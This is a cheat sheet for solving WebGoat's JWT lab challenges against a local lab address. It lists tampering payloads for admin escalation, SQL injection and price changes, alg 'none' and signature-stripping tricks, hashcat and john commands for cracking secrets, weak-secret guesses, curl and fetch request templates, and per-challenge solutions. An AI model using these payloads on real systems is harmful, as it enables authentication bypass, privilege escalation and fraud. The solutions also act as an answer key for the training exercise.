╔════════════════════════════════════════════════════════════════════════════╗
║                      JWT ATTACK CHEAT SHEET                                ║
║                    WebGoat 2025.3 - Quick Reference                        ║
╚════════════════════════════════════════════════════════════════════════════╝

┌─────────────────────────────────────────────────────────────────────────────┐
│ JWT STRUCTURE                                                               │
└─────────────────────────────────────────────────────────────────────────────┘

  HEADER         .        PAYLOAD        .      SIGNATURE
  ─────────────────────────────────────────────────────────
  eyJhbGciOiJI...  .  eyJzdWIiOiJ1c2...  .  SflKxwRJSMe...
  
  Base64URL(         Base64URL(            HMAC-SHA256(
    {"alg":"HS256",    {"sub":"user123",     header+payload,
     "typ":"JWT"}      "admin":false}        secret
  )                  )                     )

┌─────────────────────────────────────────────────────────────────────────────┐
│ ATTACK PRIORITY (Try in this order)                                        │
└─────────────────────────────────────────────────────────────────────────────┘

  [1] TAMPERING          → Modify claims, keep signature
  [2] ALGORITHM "none"   → Remove signature verification  
  [3] REMOVE SIGNATURE   → Strip signature completely
  [4] BRUTE FORCE        → Crack secret, sign properly

┌─────────────────────────────────────────────────────────────────────────────┐
│ POWERSHELL MENU OPTIONS                                                     │
└─────────────────────────────────────────────────────────────────────────────┘

  .\jwt_automation.ps1

  1  → Decode JWT Token
  2  → Tamper: admin = true           ⭐ MOST COMMON
  3  → Tamper: username = admin       ⭐ COMMON
  4  → Tamper: SQL Injection
  5  → Algorithm to "none" (keep sig)
  6  → Algorithm to "none" (remove)   ⭐ COMMON
  7  → Remove Signature Only
  8  → Brute Force Secret
  9  → Sign New Token with Secret
  10 → Password Reset Attack
  11 → Custom Field Tamper
  12 → Send JWT Request

┌─────────────────────────────────────────────────────────────────────────────┐
│ COMMON ATTACK PAYLOADS                                                      │
└─────────────────────────────────────────────────────────────────────────────┘

  ADMIN ESCALATION:
  ─────────────────
  {"sub": "user", "admin": false}  →  {"sub": "user", "admin": true}

  USERNAME CHANGE:
  ────────────────
  {"sub": "john"}  →  {"sub": "admin"}

  SQL INJECTION:
  ──────────────
  {"sub": "user"}  →  {"sub": "admin' OR '1'='1"}

  PRICE MANIPULATION:
  ───────────────────
  {"item": "laptop", "price": 999}  →  {"item": "laptop", "price": 0}

  ALGORITHM "none":
  ─────────────────
  {"alg": "HS256", "typ": "JWT"}  →  {"alg": "none", "typ": "JWT"}
  Token: header.payload.signature  →  header.payload.

┌─────────────────────────────────────────────────────────────────────────────┐
│ CURL TEMPLATES                                                              │
└─────────────────────────────────────────────────────────────────────────────┘

  GET REQUEST:
  ───────────
  curl -X GET http://192.168.254.112:8001/WebGoat/JWT/endpoint \
    -H "Authorization: Bearer TOKEN_HERE"

  POST REQUEST:
  ────────────
  curl -X POST http://192.168.254.112:8001/WebGoat/JWT/endpoint \
    -H "Authorization: Bearer TOKEN_HERE" \
    -H "Content-Type: application/json" \
    -d '{"key": "value"}'

  PASSWORD RESET:
  ──────────────
  curl -X POST http://192.168.254.112:8001/WebGoat/PasswordReset/reset \
    -H "Authorization: Bearer TOKEN_HERE" \
    -H "Content-Type: application/json" \
    -d '{"password": "newpass"}'

┌─────────────────────────────────────────────────────────────────────────────┐
│ BROWSER CONSOLE (F12)                                                       │
└─────────────────────────────────────────────────────────────────────────────┘

  DECODE TOKEN:
  ────────────
  const parts = 'TOKEN'.split('.');
  JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')))

  SEND REQUEST:
  ────────────
  fetch('http://192.168.254.112:8001/WebGoat/JWT/endpoint', {
    headers: {'Authorization': 'Bearer TOKEN'}
  }).then(r => r.json()).then(console.log)

┌─────────────────────────────────────────────────────────────────────────────┐
│ COMMON WEBGOAT SECRETS                                                      │
└─────────────────────────────────────────────────────────────────────────────┘

  ⭐ webgoat        ⭐ password       ⭐ 123456
     secret           admin             jwt
     test             token             key

┌─────────────────────────────────────────────────────────────────────────────┐
│ CHALLENGE SOLUTIONS                                                         │
└─────────────────────────────────────────────────────────────────────────────┘

  ┌───────────────────────────────────────────────────────────────────────┐
  │ CHALLENGE: Become Admin                                               │
  ├───────────────────────────────────────────────────────────────────────┤
  │ Solution: Tamper admin: false → true                                  │
  │ PowerShell: Option 2                                                  │
  │ HTML: Token Tampering > Make Admin                                    │
  └───────────────────────────────────────────────────────────────────────┘

  ┌───────────────────────────────────────────────────────────────────────┐
  │ CHALLENGE: Reset Admin Password                                       │
  ├───────────────────────────────────────────────────────────────────────┤
  │ Solution: Tamper username in reset token                              │
  │ PowerShell: Option 10                                                 │
  │ HTML: Password Reset > Method 1                                       │
  └───────────────────────────────────────────────────────────────────────┘

  ┌───────────────────────────────────────────────────────────────────────┐
  │ CHALLENGE: Buy Item for $0                                            │
  ├───────────────────────────────────────────────────────────────────────┤
  │ Solution: Tamper price: 999 → 0                                       │
  │ PowerShell: Option 11 (field: price, value: 0)                       │
  │ HTML: Token Tampering > Custom Field                                  │
  └───────────────────────────────────────────────────────────────────────┘

  ┌───────────────────────────────────────────────────────────────────────┐
  │ CHALLENGE: SQL Injection in JWT                                       │
  ├───────────────────────────────────────────────────────────────────────┤
  │ Solution: Inject SQL: admin' OR '1'='1                                │
  │ PowerShell: Option 4                                                  │
  │ HTML: Admin Access > Method 3                                         │
  └───────────────────────────────────────────────────────────────────────┘

  ┌───────────────────────────────────────────────────────────────────────┐
  │ CHALLENGE: Crack JWT Secret                                           │
  ├───────────────────────────────────────────────────────────────────────┤
  │ Solution: Brute force, then sign as admin                             │
  │ PowerShell: Option 8 (crack), then Option 9 (sign)                   │
  │ HTML: Weak Secrets tab                                                │
  └───────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│ EXTERNAL TOOLS                                                              │
└─────────────────────────────────────────────────────────────────────────────┘

  jwt.io               → https://jwt.io (decode/encode online)
  jwt_tool             → python jwt_tool.py TOKEN -T
  hashcat              → hashcat -m 16500 jwt.txt wordlist.txt
  john                 → john --format=HMAC-SHA256 jwt.txt

┌─────────────────────────────────────────────────────────────────────────────┐
│ TROUBLESHOOTING                                                             │
└─────────────────────────────────────────────────────────────────────────────┘

  Problem                  Solution
  ───────────────────────  ──────────────────────────────────────────────
  Invalid JWT format       Check for 2 dots: header.payload.signature
  Unauthorized             Check header: "Bearer TOKEN"
  Signature failed         Try algorithm "none" or remove signature
  PowerShell won't run     Set-ExecutionPolicy -Scope CurrentUser Bypass
  Can't crack secret       Use hashcat or jwt_tool with large wordlist

┌─────────────────────────────────────────────────────────────────────────────┐
│ WORKFLOW                                                                    │
└─────────────────────────────────────────────────────────────────────────────┘

  [1] Capture JWT Token
      └─> Browser DevTools (F12) > Storage/Network > Copy token

  [2] Decode Token
      └─> PowerShell Option 1 OR HTML Decoder tab

  [3] Try Attacks
      └─> Tampering (Option 2,3,4,11)
      └─> Algorithm (Option 6,7)
      └─> Brute Force (Option 8,9)

  [4] Test Token
      └─> Browser Console fetch() OR cURL OR PowerShell Option 12

  [5] Submit & Win!
      └─> Use tampered token in WebGoat challenge

┌─────────────────────────────────────────────────────────────────────────────┐
│ FILES CREATED                                                               │
└─────────────────────────────────────────────────────────────────────────────┘

  📄 jwt_complete_toolkit.html    → Interactive web tool
  📄 jwt_automation.ps1            → PowerShell script
  📄 jwt_guide.txt                 → Complete guide (500+ lines)
  📄 jwt_quickstart.txt            → Quick commands
  📄 jwt_payloads_library.txt      → 30+ payloads
  📄 jwt_summary.txt               → Tool summary
  📄 jwt_cheatsheet.txt            → This file

┌─────────────────────────────────────────────────────────────────────────────┐
│ QUICK START                                                                 │
└─────────────────────────────────────────────────────────────────────────────┘

  [1] cd c:\webgoat-scripts-1
  [2] Open jwt_complete_toolkit.html
  [3] .\jwt_automation.ps1
  [4] Capture your JWT token from WebGoat
  [5] Try Option 2 (Make Admin)
  [6] Test the tampered token
  [7] Win! 🎯

╔════════════════════════════════════════════════════════════════════════════╗
║  Target: http://192.168.254.112:8001/WebGoat/JWT                          ║
║  Tools Ready! Start with tampering (Option 2) - highest success rate!    ║
╚════════════════════════════════════════════════════════════════════════════╝
